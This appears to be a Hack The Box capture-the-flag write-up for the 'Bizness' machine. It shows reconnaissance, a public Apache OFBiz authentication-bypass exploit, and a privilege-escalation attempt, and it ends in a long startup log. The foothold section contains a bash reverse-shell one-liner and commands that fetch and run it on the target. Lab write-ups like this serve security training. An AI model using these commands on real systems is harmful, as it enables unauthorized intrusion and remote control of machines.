# Bizness

## Reconnaissance

### Nmap

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -sC -sV 10.129.24.220
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-06 19:28 UTC
Nmap scan report for bizness.htb (10.129.24.220)
Host is up (0.035s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp  open  http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
443/tcp open  ssl/http nginx 1.18.0
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
|_http-trane-info: Problem with XML parsing of /evox/about
| tls-alpn: 
|_  http/1.1
|_http-server-header: nginx/1.18.0
| tls-nextprotoneg: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-title: BizNess Incorporated
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.82 seconds
```

```c
┌──(user㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.24.220   bizness.htb
```

### Enumeration of Port 443/TCP

> http://bizness.htb

```c
┌──(user㉿kali)-[~]
└─$ whatweb https://bizness.htb/
https://bizness.htb/ [200 OK] Bootstrap, Cookies[JSESSIONID], Country[RESERVED][ZZ], Email[info@bizness.htb], HTML5, HTTPServer[nginx/1.18.0], HttpOnly[JSESSIONID], IP[10.129.24.220], JQuery, Lightbox, Script, Title[BizNess Incorporated], nginx[1.18.0]
```

```c
Powered by Apache OFBiz
```

## Foothold

> https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass

```c
┌──(user㉿kali)-[/media/…/htb/machines/bizness/serve]
└─$ cat x 
bash -c '/bin/bash -i >& /dev/tcp/10.10.16.34/6969 0>&1'
```

```c
┌──(user㉿kali)-[/media/…/machines/bizness/files/Apache-OFBiz-Authentication-Bypass]
└─$ python3 exploit.py --url https://bizness.htb --cmd 'wget http://10.10.16.34/x'
[+] Generating payload...
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] Payload generated successfully.
[+] Sending malicious serialized payload...
[+] The request has been successfully sent. Check the result of the command.
```

```c
┌──(user㉿kali)-[/media/…/machines/bizness/files/Apache-OFBiz-Authentication-Bypass]
└─$ python3 exploit.py --url https://bizness.htb --cmd 'chmod +x x'               
[+] Generating payload...
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] Payload generated successfully.
[+] Sending malicious serialized payload...
[+] The request has been successfully sent. Check the result of the command.
```

```c
┌──(user㉿kali)-[/media/…/machines/bizness/files/Apache-OFBiz-Authentication-Bypass]
└─$ python3 exploit.py --url https://bizness.htb --cmd './x'       
[+] Generating payload...
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] Payload generated successfully.
[+] Sending malicious serialized payload...
[+] The request has been successfully sent. Check the result of the command.
```

```c
┌──(user㉿kali)-[~]
└─$ nc -lnvp 6969
listening on [any] 6969 ...
connect to [10.10.16.34] from (UNKNOWN) [10.129.25.66] 33234
bash: cannot set terminal process group (794): Inappropriate ioctl for device
bash: no job control in this shell
ofbiz@bizness:/opt/ofbiz$
```

## Stabilizing Shell

```c
ofbiz@bizness:/opt/ofbiz$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
ofbiz@bizness:/opt/ofbiz$ ^Z
zsh: suspended  nc -lnvp 6969
                                                                                                                                                                                                                                            
┌──(user㉿kali)-[~]
└─$ stty raw -echo;fg
[1]  + continued  nc -lnvp 6969

ofbiz@bizness:/opt/ofbiz$ 
ofbiz@bizness:/opt/ofbiz$ export XTERM=xterm
ofbiz@bizness:/opt/ofbiz$
```

## user.txt

```c
ofbiz@bizness:~$ cat user.txt 
b00be53c4fb70ff2b9cd376907a0d8ec
```

## Enumeration

I added my `SSH Key` to get a proper shell.

```c
┌──(user㉿kali)-[~]
└─$ ssh ofbiz@bizness.htb
The authenticity of host 'bizness.htb (10.129.25.66)' can't be established.
ED25519 key fingerprint is SHA256:Yr2plP6C5tZyGiCNZeUYNDmsDGrfGijissa6WJo0yPY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'bizness.htb' (ED25519) to the list of known hosts.
Linux bizness 5.10.0-26-amd64 #1 SMP Debian 5.10.197-1 (2023-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
ofbiz@bizness:~$
```

## LinPEAS

```c
╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services                                                                                                                                                                 
/etc/systemd/system/multi-user.target.wants/ofbiz.service is calling this writable executable: /opt/ofbiz/gradlew                                                                                                                           
/etc/systemd/system/multi-user.target.wants/ofbiz.service is calling this writable executable: /opt/ofbiz/gradlew
/etc/systemd/system/ofbiz.service is calling this writable executable: /opt/ofbiz/gradlew
/etc/systemd/system/ofbiz.service is calling this writable executable: /opt/ofbiz/gradlew
You can't write on systemd PATH
```

## Privilege Escalation

### Intended way to find the hash

> https://bizness.htb/webtools/control/xmlrpc

> https://stackoverflow.com/questions/46864959/forgot-apache-ofbiz-admin-password

```c
/opt/ofbiz/gradlew "ofbiz --shutdown"
/opt/ofbiz/gradlew loadAdminUserLogin -PuserLoginId=foobar
```

```c
ofbiz@bizness:/opt/ofbiz$ ./gradlew ofbiz
> Task :compileJava UP-TO-DATE
> Task :compileGroovy UP-TO-DATE
> Task :processResources UP-TO-DATE
> Task :classes UP-TO-DATE
> Task :jar UP-TO-DATE
> Task :startScripts UP-TO-DATE
> Task :distTar UP-TO-DATE
> Task :distZip UP-TO-DATE
> Task :assemble UP-TO-DATE
> Task :checkstyleMain UP-TO-DATE
> Task :compileTestJava UP-TO-DATE
> Task :compileTestGroovy UP-TO-DATE
> Task :processTestResources NO-SOURCE
> Task :testClasses UP-TO-DATE
> Task :checkstyleTest UP-TO-DATE
> Task :test UP-TO-DATE
> Task :check UP-TO-DATE
> Task :build UP-TO-DATE

> Task :ofbiz FAILED
Config.java using configuration file start.properties
Set OFBIZ_HOME to - /opt/ofbiz
org.apache.ofbiz.base.start.StartupException: Couldn't create server socket(/127.0.0.1:10523) (Address already in use (Bind failed))
        at org.apache.ofbiz.base.start.AdminServer.<init>(AdminServer.java:59)
        at org.apache.ofbiz.base.start.StartupControlPanel.createAdminServer(StartupControlPanel.java:168)
        at org.apache.ofbiz.base.start.StartupControlPanel.start(StartupControlPanel.java:67)
        at org.apache.ofbiz.base.start.Start.main(Start.java:85)
Caused by: java.net.BindException: Address already in use (Bind failed)
        at java.base/java.net.PlainSocketImpl.socketBind(Native Method)
        at java.base/java.net.AbstractPlainSocketImpl.bind(AbstractPlainSocketImpl.java:452)
        at java.base/java.net.ServerSocket.bind(ServerSocket.java:395)
        at java.base/java.net.ServerSocket.<init>(ServerSocket.java:257)
        at org.apache.ofbiz.base.start.AdminServer.<init>(AdminServer.java:57)
        ... 3 more

FAILURE: Build failed with an exception.

* What went wrong:
Execution failed for task ':ofbiz'.
> Process 'command '/usr/lib/jvm/java-11-openjdk-amd64/bin/java'' finished with non-zero exit value 1

* Try:
Run with --stacktrace option to get the stack trace. Run with --info or --debug option to get more log output. Run with --scan to get full insights.

* Get more help at https://help.gradle.org

BUILD FAILED in 3s
13 actionable tasks: 1 executed, 12 up-to-date
```

```c
ofbiz@bizness:/opt/ofbiz$ /opt/ofbiz/gradlew "ofbiz --shutdown"
> Task :compileJava UP-TO-DATE
> Task :compileGroovy UP-TO-DATE
> Task :processResources UP-TO-DATE
> Task :classes UP-TO-DATE
> Task :jar UP-TO-DATE
> Task :startScripts UP-TO-DATE
> Task :distTar UP-TO-DATE
> Task :distZip UP-TO-DATE
> Task :assemble UP-TO-DATE
> Task :checkstyleMain UP-TO-DATE
> Task :compileTestJava UP-TO-DATE
> Task :compileTestGroovy UP-TO-DATE
> Task :processTestResources NO-SOURCE
> Task :testClasses UP-TO-DATE
> Task :checkstyleTest UP-TO-DATE
> Task :test UP-TO-DATE
> Task :check UP-TO-DATE
> Task :build UP-TO-DATE

> Task :ofbiz --shutdown
Config.java using configuration file start.properties
Set OFBIZ_HOME to - /opt/ofbiz
Shutting down server : OK

BUILD SUCCESSFUL in 2s
13 actionable tasks: 1 executed, 12 up-to-date
```

```c
ofbiz@bizness:/opt/ofbiz$ /opt/ofbiz/gradlew loadAdminUserLogin -PuserLoginId=foobar
> Task :compileJava UP-TO-DATE
> Task :compileGroovy UP-TO-DATE
> Task :processResources UP-TO-DATE
> Task :classes UP-TO-DATE
> Task :jar UP-TO-DATE
> Task :startScripts UP-TO-DATE
> Task :distTar UP-TO-DATE
> Task :distZip UP-TO-DATE
> Task :assemble UP-TO-DATE
> Task :checkstyleMain UP-TO-DATE
> Task :compileTestJava UP-TO-DATE
> Task :compileTestGroovy UP-TO-DATE
> Task :processTestResources NO-SOURCE
> Task :testClasses UP-TO-DATE
> Task :checkstyleTest UP-TO-DATE
> Task :test UP-TO-DATE
> Task :check UP-TO-DATE
> Task :build UP-TO-DATE

> Task :executeLoadAdminUser
Config.java using configuration file load-data.properties
Set OFBIZ_HOME to - /opt/ofbiz
Admin socket not configured; set to port 0
Shutdown hook disabled
2024-01-06 17:48:29,428 |main                 |ContainerLoader               |I| [Startup] Loading containers...
WARNING: An illegal reflective access operation has occurred
WARNING: Illegal reflective access by com.thoughtworks.xstream.core.util.Fields (file:/home/ofbiz/.gradle/caches/modules-2/files-2.1/com.thoughtworks.xstream/xstream/1.4.11.1/6c120c45a8c480bb2fea5b56502e3993ddd74fd2/xstream-1.4.11.1.jar) to field java.util.TreeMap.comparator
WARNING: Please consider reporting this to the maintainers of com.thoughtworks.xstream.core.util.Fields
WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations
WARNING: All illegal access operations will be denied in a future release
2024-01-06 17:48:30,344 |main                 |ContainerLoader               |I| Loading container: component-container
2024-01-06 17:48:30,445 |main                 |ComponentContainer            |I| Auto-Loading component directory : [/opt/ofbiz/framework]
2024-01-06 17:48:30,569 |main                 |ComponentContainer            |I| Added class path for component : [base]
2024-01-06 17:48:30,683 |main                 |ComponentContainer            |I| Added class path for component : [entity]
2024-01-06 17:48:30,729 |main                 |ComponentContainer            |I| Added class path for component : [security]
2024-01-06 17:48:30,856 |main                 |ComponentContainer            |I| Added class path for component : [datafile]
2024-01-06 17:48:30,903 |main                 |ComponentContainer            |I| Added class path for component : [minilang]
2024-01-06 17:48:31,175 |main                 |ComponentContainer            |I| Added class path for component : [common]
2024-01-06 17:48:31,194 |main                 |ComponentContainer            |I| Added class path for component : [service]
2024-01-06 17:48:31,222 |main                 |ComponentContainer            |I| Added class path for component : [catalina]
2024-01-06 17:48:31,237 |main                 |ComponentContainer            |I| Added class path for component : [entityext]
2024-01-06 17:48:31,251 |main                 |ComponentContainer            |I| Added class path for component : [webapp]
2024-01-06 17:48:31,419 |main                 |ComponentContainer            |I| Added class path for component : [widget]
2024-01-06 17:48:31,434 |main                 |ComponentContainer            |I| Added class path for component : [testtools]
2024-01-06 17:48:31,451 |main                 |ComponentContainer            |I| Added class path for component : [webtools]
2024-01-06 17:48:31,452 |main                 |ComponentContainer            |I| Auto-Loading component directory : [/opt/ofbiz/themes]
2024-01-06 17:48:31,858 |main                 |ComponentContainer            |I| Added class path for component : [bluelight]
2024-01-06 17:48:31,862 |main                 |ComponentContainer            |I| Added class path for component : [common-theme]
2024-01-06 17:48:31,863 |main                 |ComponentContainer            |I| Added class path for component : [flatgrey]
2024-01-06 17:48:31,863 |main                 |ComponentContainer            |I| Added class path for component : [rainbowstone]
2024-01-06 17:48:31,864 |main                 |ComponentContainer            |I| Added class path for component : [tomahawk]
2024-01-06 17:48:31,864 |main                 |ComponentContainer            |I| Auto-Loading component directory : [/opt/ofbiz/applications]
2024-01-06 17:48:31,902 |main                 |ComponentContainer            |I| Added class path for component : [datamodel]
2024-01-06 17:48:31,932 |main                 |ComponentContainer            |I| Added class path for component : [party]
2024-01-06 17:48:32,118 |main                 |ComponentContainer            |I| Added class path for component : [securityext]
2024-01-06 17:48:32,162 |main                 |ComponentContainer            |I| Added class path for component : [content]
2024-01-06 17:48:32,318 |main                 |ComponentContainer            |I| Added class path for component : [workeffort]
2024-01-06 17:48:32,393 |main                 |ComponentContainer            |I| Added class path for component : [product]
2024-01-06 17:48:32,434 |main                 |ComponentContainer            |I| Added class path for component : [manufacturing]
2024-01-06 17:48:32,458 |main                 |ComponentContainer            |I| Added class path for component : [accounting]
2024-01-06 17:48:32,484 |main                 |ComponentContainer            |I| Added class path for component : [humanres]
2024-01-06 17:48:32,686 |main                 |ComponentContainer            |I| Added class path for component : [order]
2024-01-06 17:48:32,706 |main                 |ComponentContainer            |I| Added class path for component : [marketing]
2024-01-06 17:48:32,737 |main                 |ComponentContainer            |I| Added class path for component : [commonext]
2024-01-06 17:48:32,737 |main                 |ComponentContainer            |I| Auto-Loading component directory : [/opt/ofbiz/plugins]
2024-01-06 17:48:33,414 |main                 |ComponentContainer            |I| Added class path for component : [assetmaint]
2024-01-06 17:48:33,415 |main                 |ComponentContainer            |I| Added class path for component : [bi]
2024-01-06 17:48:33,415 |main                 |ComponentContainer            |I| Not loading component [birt] because it's disabled
2024-01-06 17:48:33,415 |main                 |ComponentContainer            |I| Added class path for component : [bizness]
2024-01-06 17:48:33,415 |main                 |ComponentContainer            |I| Added class path for component : [cmssite]
2024-01-06 17:48:33,416 |main                 |ComponentContainer            |I| Added class path for component : [ebay]
2024-01-06 17:48:33,416 |main                 |ComponentContainer            |I| Not loading component [ebaystore] because it's disabled
2024-01-06 17:48:33,416 |main                 |ComponentContainer            |I| Added class path for component : [ecommerce]
2024-01-06 17:48:33,417 |main                 |ComponentContainer            |I| Added class path for component : [example]
2024-01-06 17:48:33,417 |main                 |ComponentContainer            |I| Added class path for component : [exampleext]
2024-01-06 17:48:33,418 |main                 |ComponentContainer            |I| Added class path for component : [ldap]
2024-01-06 17:48:33,418 |main                 |ComponentContainer            |I| Added class path for component : [lucene]
2024-01-06 17:48:33,418 |main                 |ComponentContainer            |I| Added class path for component : [multiflex]
2024-01-06 17:48:33,418 |main                 |ComponentContainer            |I| Added class path for component : [myportal]
2024-01-06 17:48:33,418 |main                 |ComponentContainer            |I| Added class path for component : [passport]
2024-01-06 17:48:33,419 |main                 |ComponentContainer            |I| Added class path for component : [pricat]
2024-01-06 17:48:33,419 |main                 |ComponentContainer            |I| Added class path for component : [projectmgr]
2024-01-06 17:48:33,419 |main                 |ComponentContainer            |I| Added class path for component : [scrum]
2024-01-06 17:48:33,419 |main                 |ComponentContainer            |I| Added class path for component : [solr]
2024-01-06 17:48:33,420 |main                 |ComponentContainer            |I| Added class path for component : [webpos]
2024-01-06 17:48:33,421 |main                 |ComponentContainer            |I| All components loaded
2024-01-06 17:48:33,421 |main                 |ContainerLoader               |I| Loaded container: component-container
2024-01-06 17:48:33,421 |main                 |ContainerLoader               |I| [Startup] Loading component containers...
2024-01-06 17:48:33,422 |main                 |ContainerLoader               |I| Loading container: service-container
2024-01-06 17:48:33,423 |main                 |ContainerLoader               |I| Loaded container: service-container
2024-01-06 17:48:33,423 |main                 |ContainerLoader               |I| Loading container: dataload-container
2024-01-06 17:48:33,661 |delegator-startup-1  |DelegatorFactoryImpl          |I| Creating new delegator [default] (delegator-startup-1)
2024-01-06 17:48:35,811 |delegator-startup-1  |ModelViewEntity               |W| [TestingCryptoRawView]: Conversion for complex-alias needs to be implemented for cache and in-memory eval stuff to work correctly, will not work for alias: rawEncryptedValue
2024-01-06 17:48:35,812 |delegator-startup-1  |ModelViewEntity               |W| [TestingCryptoRawView]: Conversion for complex-alias needs to be implemented for cache and in-memory eval stuff to work correctly, will not work for alias: rawSaltedEncryptedValue
2024-01-06 17:48:36,146 |delegator-startup-1  |ModelViewEntity               |W| [OrderItemQuantityReportGroupByItem]: Conversion for complex-alias needs to be implemented for cache and in-memory eval stuff to work correctly, will not work for alias: quantityOrdered
2024-01-06 17:48:36,146 |delegator-startup-1  |ModelViewEntity               |W| [OrderItemQuantityReportGroupByItem]: Conversion for complex-alias needs to be implemented for cache and in-memory eval stuff to work correctly, will not work for alias: quantityOpen
2024-01-06 17:48:36,147 |delegator-startup-1  |ModelViewEntity               |W| [OrderItemQuantityReportGroupByProduct]: Conversion for complex-alias needs to be implemented for cache and in-memory eval stuff to work correctly, will not work for alias: quantityOrdered
2024-01-06 17:48:36,147 |delegator-startup-1  |ModelViewEntity               |W| [OrderItemQuantityReportGroupByProduct]: Conversion for complex-alias needs to be implemented for cache and in-memory eval stuff to work correctly, will not work for alias: quantityOpen
2024-01-06 17:48:36,149 |delegator-startup-1  |ModelViewEntity               |W| [OrderReportSalesGroupByProduct]: Conversion for complex-alias needs to be implemented for cache and in-memory eval stuff to work correctly, will not work for alias: quantityOrdered
2024-01-06 17:48:36,149 |delegator-startup-1  |ModelViewEntity               |W| [OrderReportSalesGroupByProduct]: Conversion for complex-alias needs to be implemented for cache and in-memory eval stuff to work correctly, will not work for alias: amount
2024-01-06 17:48:36,167 |delegator-startup-1  |ModelViewEntity               |W| [OrderItemAndShipGrpInvResAndItemSum]: Conversion for complex-alias needs to be implemented for cache and in-memory eval stuff to work correctly, will not work for alias: quantityOrdered
2024-01-06 17:48:36,167 |delegator-startup-1  |ModelViewEntity               |W| [OrderItemAndShipGrpInvResAndItemSum]: Conversion for complex-alias needs to be implemented for cache and in-memory eval stuff to work correctly, will not work for alias: totQuantityAvailable
2024-01-06 17:48:36,170 |delegator-startup-1  |ModelViewEntity               |W| [ExampleStatusDetail]: Conversion for complex-alias needs to be implemented for cache and in-memory eval stuff to work correctly, will not work for alias: statusDelay
2024-01-06 17:48:36,238 |delegator-startup-1  |ModelViewEntity               |W| [ProjectPhaseTaskActualRatedHoursView]: Conversion for complex-alias needs to be implemented for cache and in-memory eval stuff to work correctly, will not work for alias: totalRatedHours
2024-01-06 17:48:36,260 |delegator-startup-1  |ModelReader                   |I| Finished loading entities; #Entities=866 #ViewEntities=321 #Fields=9124 #Relationships=2975 #AutoRelationships=2177
2024-01-06 17:48:36,271 |delegator-startup-1  |GenericDelegator              |I| Doing entity definition check...
2024-01-06 17:48:36,273 |delegator-startup-1  |ModelEntityChecker            |I| [initReservedWords] array length = 1025
2024-01-06 17:48:36,335 |OFBiz-batch-1        |GenericDelegator              |I| Delegator "default" initializing helper "localderbyolap" for entity group "org.apache.ofbiz.olap".
2024-01-06 17:48:36,338 |OFBiz-batch-1        |GenericDelegator              |I| Doing database check as requested in entityengine.xml with addMissing=true
2024-01-06 17:48:36,346 |OFBiz-batch-2        |GenericDelegator              |I| Delegator "default" initializing helper "localderby" for entity group "org.apache.ofbiz".
2024-01-06 17:48:36,537 |OFBiz-batch-2        |GenericDelegator              |I| Doing database check as requested in entityengine.xml with addMissing=true
2024-01-06 17:48:36,541 |OFBiz-batch-3        |GenericDelegator              |I| Delegator "default" initializing helper "localderbytenant" for entity group "org.apache.ofbiz.tenant".
2024-01-06 17:48:36,622 |OFBiz-batch-3        |GenericDelegator              |I| Doing database check as requested in entityengine.xml with addMissing=true
2024-01-06 17:48:37,567 |OFBiz-batch-1        |DatabaseUtil                  |I| Database Product Name is Apache Derby
2024-01-06 17:48:37,568 |OFBiz-batch-3        |DatabaseUtil                  |I| Database Product Name is Apache Derby
2024-01-06 17:48:37,572 |OFBiz-batch-3        |DatabaseUtil                  |I| Database Product Version is 10.14.2.0 - (1828579)
2024-01-06 17:48:37,572 |OFBiz-batch-3        |DatabaseUtil                  |I| Database Driver Name is Apache Derby Embedded JDBC Driver
2024-01-06 17:48:37,572 |OFBiz-batch-3        |DatabaseUtil                  |I| Database Driver Version is 10.14.2.0 - (1828579)
2024-01-06 17:48:37,573 |OFBiz-batch-3        |DatabaseUtil                  |I| Database Driver JDBC Version is 4.2
2024-01-06 17:48:37,573 |OFBiz-batch-3        |DatabaseUtil                  |I| Database Setting/Support Information (those with a * should be true):
2024-01-06 17:48:37,573 |OFBiz-batch-3        |DatabaseUtil                  |I| - supports transactions     [true]*
2024-01-06 17:48:37,574 |OFBiz-batch-3        |DatabaseUtil                  |I| - isolation None            [false]
2024-01-06 17:48:37,574 |OFBiz-batch-3        |DatabaseUtil                  |I| - isolation ReadCommitted   [true]
2024-01-06 17:48:37,576 |OFBiz-batch-3        |DatabaseUtil                  |I| - isolation ReadUncommitted [true]
2024-01-06 17:48:37,576 |OFBiz-batch-1        |DatabaseUtil                  |I| Database Product Version is 10.14.2.0 - (1828579)
2024-01-06 17:48:37,577 |OFBiz-batch-3        |DatabaseUtil                  |I| - isolation RepeatableRead  [true]
2024-01-06 17:48:37,577 |OFBiz-batch-1        |DatabaseUtil                  |I| Database Driver Name is Apache Derby Embedded JDBC Driver
2024-01-06 17:48:37,577 |OFBiz-batch-1        |DatabaseUtil                  |I| Database Driver Version is 10.14.2.0 - (1828579)
2024-01-06 17:48:37,577 |OFBiz-batch-3        |DatabaseUtil                  |I| - isolation Serializable    [true]
2024-01-06 17:48:37,578 |OFBiz-batch-3        |DatabaseUtil                  |I| - forward only type         [true]
2024-01-06 17:48:37,578 |OFBiz-batch-1        |DatabaseUtil                  |I| Database Driver JDBC Version is 4.2
2024-01-06 17:48:37,578 |OFBiz-batch-1        |DatabaseUtil                  |I| Database Setting/Support Information (those with a * should be true):
2024-01-06 17:48:37,578 |OFBiz-batch-1        |DatabaseUtil                  |I| - supports transactions     [true]*
2024-01-06 17:48:37,579 |OFBiz-batch-3        |DatabaseUtil                  |I| - scroll sensitive type     [false]
2024-01-06 17:48:37,579 |OFBiz-batch-1        |DatabaseUtil                  |I| - isolation None            [false]
2024-01-06 17:48:37,579 |OFBiz-batch-3        |DatabaseUtil                  |I| - scroll insensitive type   [true]
2024-01-06 17:48:37,580 |OFBiz-batch-1        |DatabaseUtil                  |I| - isolation ReadCommitted   [true]
2024-01-06 17:48:37,580 |OFBiz-batch-3        |DatabaseUtil                  |I| - is case sensitive         [false]
2024-01-06 17:48:37,580 |OFBiz-batch-1        |DatabaseUtil                  |I| - isolation ReadUncommitted [true]
2024-01-06 17:48:37,580 |OFBiz-batch-3        |DatabaseUtil                  |I| - stores LowerCase          [false]
2024-01-06 17:48:37,581 |OFBiz-batch-1        |DatabaseUtil                  |I| - isolation RepeatableRead  [true]
2024-01-06 17:48:37,583 |OFBiz-batch-3        |DatabaseUtil                  |I| - stores MixedCase          [false]
2024-01-06 17:48:37,584 |OFBiz-batch-1        |DatabaseUtil                  |I| - isolation Serializable    [true]
2024-01-06 17:48:37,584 |OFBiz-batch-3        |DatabaseUtil                  |I| - stores UpperCase          [true]
2024-01-06 17:48:37,584 |OFBiz-batch-1        |DatabaseUtil                  |I| - forward only type         [true]
2024-01-06 17:48:37,585 |OFBiz-batch-3        |DatabaseUtil                  |I| - max table name length     [128]
2024-01-06 17:48:37,585 |OFBiz-batch-1        |DatabaseUtil                  |I| - scroll sensitive type     [false]
2024-01-06 17:48:37,585 |OFBiz-batch-1        |DatabaseUtil                  |I| - scroll insensitive type   [true]
2024-01-06 17:48:37,585 |OFBiz-batch-3        |DatabaseUtil                  |I| - max column name length    [128]
2024-01-06 17:48:37,586 |OFBiz-batch-1        |DatabaseUtil                  |I| - is case sensitive         [false]
2024-01-06 17:48:37,586 |OFBiz-batch-3        |DatabaseUtil                  |I| - concurrent connections    [0]
2024-01-06 17:48:37,587 |OFBiz-batch-1        |DatabaseUtil                  |I| - stores LowerCase          [false]
2024-01-06 17:48:37,587 |OFBiz-batch-3        |DatabaseUtil                  |I| - concurrent statements     [0]
2024-01-06 17:48:37,587 |OFBiz-batch-1        |DatabaseUtil                  |I| - stores MixedCase          [false]
2024-01-06 17:48:37,588 |OFBiz-batch-3        |DatabaseUtil                  |I| - ANSI SQL92 Entry          [true]
2024-01-06 17:48:37,588 |OFBiz-batch-1        |DatabaseUtil                  |I| - stores UpperCase          [true]
2024-01-06 17:48:37,588 |OFBiz-batch-3        |DatabaseUtil                  |I| - ANSI SQL92 Intermediate   [false]
2024-01-06 17:48:37,589 |OFBiz-batch-1        |DatabaseUtil                  |I| - max table name length     [128]
2024-01-06 17:48:37,589 |OFBiz-batch-1        |DatabaseUtil                  |I| - max column name length    [128]
2024-01-06 17:48:37,589 |OFBiz-batch-3        |DatabaseUtil                  |I| - ANSI SQL92 Full           [false]
2024-01-06 17:48:37,589 |OFBiz-batch-1        |DatabaseUtil                  |I| - concurrent connections    [0]
2024-01-06 17:48:37,590 |OFBiz-batch-3        |DatabaseUtil                  |I| - ODBC SQL Grammar Core     [false]
2024-01-06 17:48:37,590 |OFBiz-batch-1        |DatabaseUtil                  |I| - concurrent statements     [0]
2024-01-06 17:48:37,590 |OFBiz-batch-3        |DatabaseUtil                  |I| - ODBC SQL Grammar Extended [false]
2024-01-06 17:48:37,590 |OFBiz-batch-1        |DatabaseUtil                  |I| - ANSI SQL92 Entry          [true]
2024-01-06 17:48:37,591 |OFBiz-batch-3        |DatabaseUtil                  |I| - ODBC SQL Grammar Minimum  [true]
2024-01-06 17:48:37,591 |OFBiz-batch-1        |DatabaseUtil                  |I| - ANSI SQL92 Intermediate   [false]
2024-01-06 17:48:37,591 |OFBiz-batch-3        |DatabaseUtil                  |I| - outer joins               [true]*
2024-01-06 17:48:37,591 |OFBiz-batch-1        |DatabaseUtil                  |I| - ANSI SQL92 Full           [false]
2024-01-06 17:48:37,592 |OFBiz-batch-3        |DatabaseUtil                  |I| - limited outer joins       [true]
2024-01-06 17:48:37,592 |OFBiz-batch-1        |DatabaseUtil                  |I| - ODBC SQL Grammar Core     [false]
2024-01-06 17:48:37,592 |OFBiz-batch-3        |DatabaseUtil                  |I| - full outer joins          [false]
2024-01-06 17:48:37,592 |OFBiz-batch-1        |DatabaseUtil                  |I| - ODBC SQL Grammar Extended [false]
2024-01-06 17:48:37,593 |OFBiz-batch-3        |DatabaseUtil                  |I| - group by                  [true]*
2024-01-06 17:48:37,593 |OFBiz-batch-1        |DatabaseUtil                  |I| - ODBC SQL Grammar Minimum  [true]
2024-01-06 17:48:37,596 |OFBiz-batch-1        |DatabaseUtil                  |I| - outer joins               [true]*
2024-01-06 17:48:37,596 |OFBiz-batch-3        |DatabaseUtil                  |I| - group by not in select    [true]
2024-01-06 17:48:37,596 |OFBiz-batch-3        |DatabaseUtil                  |I| - column aliasing           [true]
2024-01-06 17:48:37,596 |OFBiz-batch-1        |DatabaseUtil                  |I| - limited outer joins       [true]
2024-01-06 17:48:37,597 |OFBiz-batch-3        |DatabaseUtil                  |I| - order by not in select    [false]
2024-01-06 17:48:37,597 |OFBiz-batch-1        |DatabaseUtil                  |I| - full outer joins          [false]
2024-01-06 17:48:37,597 |OFBiz-batch-3        |DatabaseUtil                  |I| - alter table add column    [true]*
2024-01-06 17:48:37,598 |OFBiz-batch-1        |DatabaseUtil                  |I| - group by                  [true]*
2024-01-06 17:48:37,598 |OFBiz-batch-1        |DatabaseUtil                  |I| - group by not in select    [true]
2024-01-06 17:48:37,598 |OFBiz-batch-3        |DatabaseUtil                  |I| - non-nullable column       [true]*
2024-01-06 17:48:37,600 |OFBiz-batch-3        |DatabaseUtil                  |I| - default fetchsize        [1]
2024-01-06 17:48:37,600 |OFBiz-batch-1        |DatabaseUtil                  |I| - column aliasing           [true]
2024-01-06 17:48:37,600 |OFBiz-batch-1        |DatabaseUtil                  |I| - order by not in select    [false]
2024-01-06 17:48:37,601 |OFBiz-batch-1        |DatabaseUtil                  |I| - alter table add column    [true]*
2024-01-06 17:48:37,601 |OFBiz-batch-1        |DatabaseUtil                  |I| - non-nullable column       [true]*
2024-01-06 17:48:37,601 |OFBiz-batch-1        |DatabaseUtil                  |I| - default fetchsize        [1]
2024-01-06 17:48:37,601 |OFBiz-batch-1        |DatabaseUtil                  |I| - named parameters         [ SKIPPED ]
2024-01-06 17:48:37,602 |OFBiz-batch-1        |DatabaseUtil                  |I| Getting Table Info From Database
2024-01-06 17:48:37,604 |OFBiz-batch-3        |DatabaseUtil                  |I| - named parameters         [ SKIPPED ]
2024-01-06 17:48:37,604 |OFBiz-batch-3        |DatabaseUtil                  |I| Getting Table Info From Database
Jan 06, 2024 5:48:37 PM java.io.ObjectInputFilter$Config lambda$static$0
INFO: Creating serialization filter from maxarray=100000;maxdepth=20;maxrefs=1000;maxbytes=500000
2024-01-06 17:48:38,145 |OFBiz-batch-3        |DatabaseUtil                  |I| Getting Column Info From Database
2024-01-06 17:48:38,145 |OFBiz-batch-1        |DatabaseUtil                  |I| Getting Column Info From Database
2024-01-06 17:48:38,200 |OFBiz-batch-2        |DatabaseUtil                  |I| Database Product Name is Apache Derby
2024-01-06 17:48:38,200 |OFBiz-batch-2        |DatabaseUtil                  |I| Database Product Version is 10.14.2.0 - (1828579)
